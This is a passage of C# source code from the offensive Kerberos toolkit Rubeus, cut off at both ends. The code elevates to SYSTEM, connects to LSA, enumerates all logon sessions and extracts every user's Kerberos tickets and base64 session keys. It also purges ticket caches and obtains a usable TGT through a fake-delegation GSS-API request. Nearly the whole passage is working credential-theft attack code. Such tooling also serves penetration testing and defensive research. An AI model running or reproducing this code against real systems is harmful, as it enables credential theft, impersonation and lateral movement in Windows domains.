                    DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                    DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                    long timeSkew = response.Ticket.TimeSkew;
                    int encodedTicketSize = response.Ticket.EncodedTicketSize;
                    string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                    // extract the ticket and base64 encode it
                    byte[] encodedTicket = new byte[encodedTicketSize];
                    Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                    string base64TGT = Convert.ToBase64String(encodedTicket);

                    Console.WriteLine("  ServiceName              : {0}", serviceName);
                    Console.WriteLine("  TargetName               : {0}", targetName);
                    Console.WriteLine("  ClientName               : {0}", clientName);
                    Console.WriteLine("  DomainName               : {0}", domainName);
                    Console.WriteLine("  TargetDomainName         : {0}", targetDomainName);
                    Console.WriteLine("  AltTargetDomainName      : {0}", altTargetDomainName);
                    Console.WriteLine("  SessionKeyType           : {0}", sessionKeyType);
                    Console.WriteLine("  Base64SessionKey         : {0}", base64SessionKey);
                    Console.WriteLine("  KeyExpirationTime        : {0}", keyExpirationTime);
                    Console.WriteLine("  TicketFlags              : {0}", ticketFlags);
                    Console.WriteLine("  StartTime                : {0}", startTime);
                    Console.WriteLine("  EndTime                  : {0}", endTime);
                    Console.WriteLine("  RenewUntil               : {0}", renewUntil);
                    Console.WriteLine("  TimeSkew                 : {0}", timeSkew);
                    Console.WriteLine("  EncodedTicketSize        : {0}", encodedTicketSize);
                    Console.WriteLine("  Base64EncodedTicket      :\r\n");
                    // display the TGT, columns of 100 chararacters
                    foreach (string line in Helpers.Split(base64TGT, 100)) {
                        Console.WriteLine("    {0}", line);
                    }
                    Console.WriteLine("\r\n");
                }
                else {
                    Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                        winError, serverName, Helpers.GetNativeErrorMessage(winError));
                }
                return true;
            }
            finally {
                // clean up
                if (IntPtr.Zero != responsePointer) {
                    Interop.LsaFreeReturnBuffer(responsePointer);
                }
                if (IntPtr.Zero != unmanagedAddr) {
                    Marshal.FreeHGlobal(unmanagedAddr);
                }
            }
        }

        internal static void ListKerberosTicketDataAllUsers(Interop.LUID targetLuid, string targetService = "", bool monitor = false, bool harvest = false)
        {
            // extracts Kerberos ticket data for all users on the system (assuming elevation)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            if (!monitor) {
                Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
            }
            if (!targetLuid.IsEmpty) {
                Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
            }
            if (!String.IsNullOrEmpty(targetService)) {
                Console.WriteLine("[*] Target service  : {0:x}", targetService);
                if (!monitor) {
                    Console.WriteLine();
                }
            }

            int totalTicketCount = 0;
            int extractedTicketCount = 0;
            int authPack;
            IntPtr lsaHandle = RegisterUser32LogonProcesss();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero) {
                string currentName = WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM") {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = RegisterUser32LogonProcesss();
                }
                else {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = RegisterUser32LogonProcesss();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try {
                // obtains the unique identifier for the kerberos authentication package.
                LSACall(Interop.LsaLookupAuthenticationPackage(lsaHandle, KerberosLsaInputString, out authPack));

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++) {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero) {
                        // user session data
                        string username = data.Username.GetValue();
                        SecurityIdentifier sid = new SecurityIdentifier(data.PSiD);
                        string domain = data.LoginDomain.GetValue();
                        string authpackage = data.AuthenticationPackage.GetValue();
                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = data.LogonServer.GetValue();
                        string dnsDomainName = data.DnsDomainName.GetValue();
                        string upn = data.Upn.GetValue();
                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                        int returnBufferLength = 0;
                        int protocalStatus = 0;

                        // input object for querying the ticket cache for a specific logon ID
                        Interop.LUID userLogonID = data.LoginID;
                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery =
                            new Interop.KERB_QUERY_TKT_CACHE_REQUEST(userLogonID);
                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets =
                            new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                        Interop.KERB_TICKET_CACHE_INFO ticket;

                        if (targetLuid.IsEmpty || data.LoginID.Equals(targetLuid)) {
                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                            // query LSA, specifying we want the ticket cache
                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                            LSACall(Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus));

                            if (ticketsPointer != IntPtr.Zero) {
                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                int count2 = tickets.CountOfTickets;

                                if (count2 != 0) {
                                    Console.WriteLine("\r\n  UserName                 : {0}", username);
                                    Console.WriteLine("  Domain                   : {0}", domain);
                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
                                    Console.WriteLine("  UserSID                  : {0}", sid.Value);
                                    Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                                    Console.WriteLine("  LogonType                : {0}", logonType);
                                    Console.WriteLine("  LogonTime                : {0}", logonTime);
                                    Console.WriteLine("  LogonServer              : {0}", logonServer);
                                    Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                                    Console.WriteLine("  UserPrincipalName        : {0}", upn);
                                    Console.WriteLine();
                                    if (!monitor) {
                                        Console.WriteLine("    [*] Enumerated {0} ticket(s):\r\n", count2);
                                    }
                                    totalTicketCount += count2;

                                    // get the size of the structures we're iterating over
                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                    for (int j = 0; j < count2; j++) {
                                        // iterate through the result structures
                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                        // parse the new ptr to the appropriate structure
                                        ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        // extract the serverName and ticket flags
                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                                        if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase))) {
                                            extractedTicketCount++;

                                            // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                            IntPtr responsePointer = IntPtr.Zero;
                                            // signal that we want encoded .kirbi's returned
                                            // the specific logon session ID
                                            Interop.KERB_RETRIEVE_TKT_REQUEST request =
                                                new Interop.KERB_RETRIEVE_TKT_REQUEST(userLogonID,
                                                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage);
                                            Interop.KERB_RETRIEVE_TKT_RESPONSE response =
                                                new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                            request.TicketFlags = ticket.TicketFlags;
                                            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                            request.EncryptionType = 0x0;
                                            // the target ticket name we want the ticket for
                                            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                            request.TargetName = tName;

                                            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                            //      for KerbRetrieveEncodedTicketMessages

                                            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                            int newStructSize = structSize + tName.MaximumLength;
                                            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                            // marshal the struct from a managed object to an unmanaged block of memory.
                                            Marshal.StructureToPtr(request, unmanagedAddr, false);
                                            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
                                            // copy unicode chars to the new location
                                            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
                                            // update the target name buffer ptr
                                            Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
                                            // actually get the data
                                            NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);
                                            // translate the LSA error (if any) to a Windows error
                                            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
                                                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                string serviceName = response.Ticket.GetServiceName();
                                                string targetName = "";
                                                if (response.Ticket.TargetName != IntPtr.Zero) {
                                                    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    if (targetNameStruct.NameCount == 1) {
                                                        targetName = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                                    }
                                                    else if (targetNameStruct.NameCount == 2) {
                                                        targetName = string.Format("{0}/{1}",
                                                            Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim(),
                                                            Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim());
                                                    }
                                                }
                                                string clientName = "";
                                                if (response.Ticket.ClientName != IntPtr.Zero) {
                                                    Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                                                    if (clientNameStruct.NameCount == 1) {
                                                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                                        clientName = clientNameStr1;
                                                    }
                                                    else if (clientNameStruct.NameCount == 2) {
                                                        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                                        string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
                                                        clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
                                                    }
                                                }
                                                string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                                                string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                                                string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                                                // extract the session key
                                                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                                                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                                                byte[] sessionKey = new byte[sessionKeyLength];
                                                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                                                string base64SessionKey = Convert.ToBase64String(sessionKey);

                                                DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                                                DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                                                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                                                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                                                Int64 timeSkew = response.Ticket.TimeSkew;
                                                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                                                // extract the ticket and base64 encode it
                                                byte[] encodedTicket = new byte[encodedTicketSize];
                                                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                                                string base64TGT = Convert.ToBase64String(encodedTicket);

                                                Console.WriteLine("    ServiceName              : {0}", serviceName);
                                                Console.WriteLine("    TargetName               : {0}", targetName);
                                                Console.WriteLine("    ClientName               : {0}", clientName);
                                                Console.WriteLine("    DomainName               : {0}", domainName);
                                                Console.WriteLine("    TargetDomainName         : {0}", targetDomainName);
                                                Console.WriteLine("    AltTargetDomainName      : {0}", altTargetDomainName);
                                                Console.WriteLine("    SessionKeyType           : {0}", sessionKeyType);
                                                Console.WriteLine("    Base64SessionKey         : {0}", base64SessionKey);
                                                Console.WriteLine("    KeyExpirationTime        : {0}", keyExpirationTime);
                                                Console.WriteLine("    TicketFlags              : {0}", ticketFlags);
                                                Console.WriteLine("    StartTime                : {0}", startTime);
                                                Console.WriteLine("    EndTime                  : {0}", endTime);
                                                Console.WriteLine("    RenewUntil               : {0}", renewUntil);
                                                Console.WriteLine("    TimeSkew                 : {0}", timeSkew);
                                                Console.WriteLine("    EncodedTicketSize        : {0}", encodedTicketSize);
                                                Console.WriteLine("    Base64EncodedTicket      :\r\n");
                                                // display the TGT, columns of 100 chararacters
                                                foreach (string line in Helpers.Split(base64TGT, 100)) {
                                                    Console.WriteLine("      {0}", line);
                                                }
                                                Console.WriteLine();
                                            }
                                            else {
                                                Console.WriteLine("\r\n    [X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                                                    winError, serverName, Helpers.GetNativeErrorMessage(winError));
                                            }

                                            // clean up
                                            Interop.LsaFreeReturnBuffer(responsePointer);
                                            Marshal.FreeHGlobal(unmanagedAddr);
                                        }
                                    }
                                }
                            }

                            // cleanup
                            Interop.LsaFreeReturnBuffer(ticketsPointer);
                            Marshal.FreeHGlobal(tQueryPtr);
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                if (!monitor) {
                    Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
                }
                Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
            }
            catch (Exception ex) {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }

        /// <summary>Zxtracts Kerberos ticket data for the current user first uses
        /// LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a
        /// KerbQueryTicketCacheMessage message type to enumerate all cached tickets, then uses
        /// LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type to
        /// extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)</summary>
        /// <param name="targetService"></param>
        /// <remarks>adapted partially from Vincent LE TOUX' work
        /// https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
        /// and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
        /// also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
        /// </remarks>
        private static void ListKerberosTicketDataCurrentUser(string targetService)
        {
            Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (Current User)\r\n");
            if (!string.IsNullOrEmpty(targetService)) {
                Console.WriteLine("\r\n[*] Target service  : {0:x}\r\n\r\n", targetService);
            }

            IntPtr ticketsPointer = IntPtr.Zero;
            int authenticationPackageIdentifier;
            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr lsaHandle;

            // If we want to look at tickets from a session other than our own
            // then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
            LSACall(Interop.LsaConnectUntrusted(out lsaHandle));
            // obtains the unique identifier for the kerberos authentication package.
            LSACall(Interop.LsaLookupAuthenticationPackage(lsaHandle, KerberosLsaInputString,
                out authenticationPackageIdentifier));

            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery =
                new Interop.KERB_QUERY_TKT_CACHE_REQUEST(Interop.LUID.Empty,
                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage);
            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets =
                new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();

            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
            LSACall(Interop.LsaCallAuthenticationPackage(lsaHandle, authenticationPackageIdentifier,
                cacheQueryPtr, Marshal.SizeOf(cacheQuery),
                out ticketsPointer, out returnBufferLength, out protocalStatus));

            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
            int totalTicketCount = cacheTickets.CountOfTickets;
            Console.WriteLine("[*] Returned {0} tickets\r\n", totalTicketCount);

            // get the size of the structures we're iterating over
            int dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));
            uint extractedTicketCount = 0;
            for (int ticketIndex = 0; ticketIndex < totalTicketCount; ticketIndex++) {
                // iterate through the result structures
                IntPtr currTicketPtr = (IntPtr)((ticketsPointer.ToInt64() + (8 + ticketIndex * dataSize)));

                if (ListKerberosTicketData(lsaHandle, authenticationPackageIdentifier, currTicketPtr,
                    targetService))
                {
                    extractedTicketCount++;
                }
            }
            // clean up
            Interop.LsaFreeReturnBuffer(ticketsPointer);
            Marshal.FreeHGlobal(cacheQueryPtr);
            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
            Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
        }

        /// <summary>Consistently handles LSA calls. Either returns the intended result or throw an
        /// exception if an error has been returned.</summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="code"></param>
        /// <param name="result"></param>
        /// <returns></returns>
        private static T LSACall<T>(Rubeus.lib.NativeReturnCode code, T result)
        {
            if (Rubeus.lib.NativeReturnCode.STATUS_SUCCESS == code) { return result; }
            throw new Rubeus.lib.LSAException(code);
        }
        private static void LSACall(Rubeus.lib.NativeReturnCode code)
        {
            if (Rubeus.lib.NativeReturnCode.STATUS_SUCCESS == code) { return; }
            throw new Rubeus.lib.LSAException(code);
        }

        internal static void Purge(uint targetLuid = 0)
        {
            Console.WriteLine("\r\n[*] Action: Purge Tickets");

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ProtocalStatus;

            if (0 != targetLuid) {
                if (!Helpers.IsHighIntegrity()) {
                    Console.WriteLine("[X] You need to be in high integrity to purge tickets from a different logon session");
                    return;
                }
                else {
                    string currentName = WindowsIdentity.GetCurrent().Name;
                    if (currentName == "NT AUTHORITY\\SYSTEM") {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = RegisterUser32LogonProcesss();
                    }
                    else {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = RegisterUser32LogonProcesss();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                LSACall(Interop.LsaConnectUntrusted(out LsaHandle));
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try {
                NativeReturnCode ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle,
                    KerberosLsaInputString, out AuthenticationPackage);
                if (ntstatus != 0) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
                    return;
                }

                Interop.KERB_PURGE_TKT_CACHE_REQUEST request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;

                if (0 != targetLuid) {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
                    request.LogonId = new Interop.LUID(targetLuid);
                }

                //Interop.LSA_STRING_IN ServerName;
                //ServerName.Length = 0;
                //ServerName.MaximumLength = 0;
                //ServerName.Buffer = null;

                //Interop.LSA_STRING_IN RealmName;
                //ServerName.Length = 0;
                //ServerName.MaximumLength = 0;
                //ServerName.Buffer = null;

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (ntstatus != 0) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
                    return;
                }
                if (ProtocalStatus != 0) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
                    return;
                }
                Console.WriteLine("[+] Tickets successfully purged!");
            }
            finally {
                if (inputBuffer != IntPtr.Zero) {
                    Marshal.FreeHGlobal(inputBuffer);
                }
                if (IntPtr.Zero != LsaHandle) {
                    Interop.LsaDeregisterLogonProcess(LsaHandle);
                }
            }
        }

        /// <summary>Establishes a connection to the LSA server and verifies that the caller is
        /// a logon application used for Kerberos ticket enumeration</summary>
        /// <returns></returns>
        private static IntPtr RegisterUser32LogonProcesss()
        {
            IntPtr lsaHandle;
            ulong securityMode; // MSDN documentation states this output value is meaningless.
            return LSACall(Interop.LsaRegisterLogonProcess(
                new Interop.LSA_STRING_IN("User32LogonProcesss"),
                out lsaHandle, out securityMode), lsaHandle);
        }

        internal static byte[] RequestFakeDelegTicket(string targetSPN = "")
        {
            Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
            if (string.IsNullOrEmpty(targetSPN)) {
                Console.WriteLine("[*] No target SPN specified, attempting to build 'HOST/dc.domain.com'");
                string domainController = Networking.GetDCName();
                if (string.IsNullOrEmpty(domainController)) {
                    Console.WriteLine("[X] Error retrieving current domain controller");
                    return null;
                }
                targetSPN = String.Format("HOST/{0}", domainController);
            }
            Interop.SECURITY_HANDLE phCredential = new Interop.SECURITY_HANDLE();
            try {
                Interop.SECURITY_INTEGER ptsExpiry = new Interop.SECURITY_INTEGER();
                int SECPKG_CRED_OUTBOUND = 2;

                // first get a handle to the Kerberos package
                int status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);
                if (0 != status) {
                    Console.WriteLine("[X] Error: AcquireCredentialsHandle error: {0}", status);
                    return null;
                }
                Interop.SecBufferDesc ClientToken = new Interop.SecBufferDesc(12288);
                Interop.SECURITY_HANDLE ClientContext = new Interop.SECURITY_HANDLE();
                uint ClientContextAttributes = 0;
                Interop.SECURITY_INTEGER ClientLifeTime = new Interop.SECURITY_INTEGER();
                int SECURITY_NATIVE_DREP = 0x00000010;
                int SEC_E_OK = 0x00000000;
                int SEC_I_CONTINUE_NEEDED = 0x00090312;

                Console.WriteLine("[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'", targetSPN);

                // now initialize the fake delegate ticket for the specified targetname (default HOST/DC.domain.com)
                int status2 = Interop.InitializeSecurityContext(ref phCredential, IntPtr.Zero,
                    targetSPN, // null string pszTargetName,
                    (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),
                    0, //int Reserved1,
                    SECURITY_NATIVE_DREP, //int TargetDataRep
                    IntPtr.Zero,    //Always zero first time around...
                    0, //int Reserved2,
                    out ClientContext, //pHandle CtxtHandle = SecHandle
                    out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc
                    out ClientContextAttributes, //ref int pfContextAttr,
                    out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp

                try {
                    if ((status2 != SEC_E_OK) && (status2 != SEC_I_CONTINUE_NEEDED)) {
                        Console.WriteLine("[X] Error: InitializeSecurityContext error: {0}", status2);
                        return null;
                    }
                    Console.WriteLine("[+] Kerberos GSS-API initialization success!");
                    if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) != 1) {
                        Console.WriteLine("[X] Error: Client is not allowed to delegate to target: {0}", targetSPN);
                        return null;
                    }
                    Console.WriteLine("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.");

                    // the fake delegate AP-REQ ticket is now in the cache!

                    // the Kerberos OID to search for in the output stream
                    //  from Kekeo -> https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
                    byte[] KeberosV5 = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2
                    byte[] ClientTokenArray = ClientToken.GetSecBufferByteArray();
                    int index = Helpers.SearchBytePattern(KeberosV5, ClientTokenArray);
                    if (0 >= index) {
                        Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                        return null;
                    }
                    int startIndex = index += KeberosV5.Length;

                    // check if the first two bytes == TOK_ID_KRB_AP_REQ
                    if ((ClientTokenArray[startIndex] != 1) || (ClientTokenArray[startIndex + 1] != 0)) {
                        Console.WriteLine("[X] Error: Kerberos OID not found in output buffer!");
                        return null;
                    }
                    Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");

                    startIndex += 2;
                    byte[] apReqArray = new byte[ClientTokenArray.Length-startIndex];
                    Buffer.BlockCopy(ClientTokenArray, startIndex, apReqArray, 0, apReqArray.Length);

                    // decode the supplied bytes to an AsnElt object
                    //  false == ignore trailing garbage
                    AsnElt asn_AP_REQ = AsnElt.Decode(apReqArray, false);

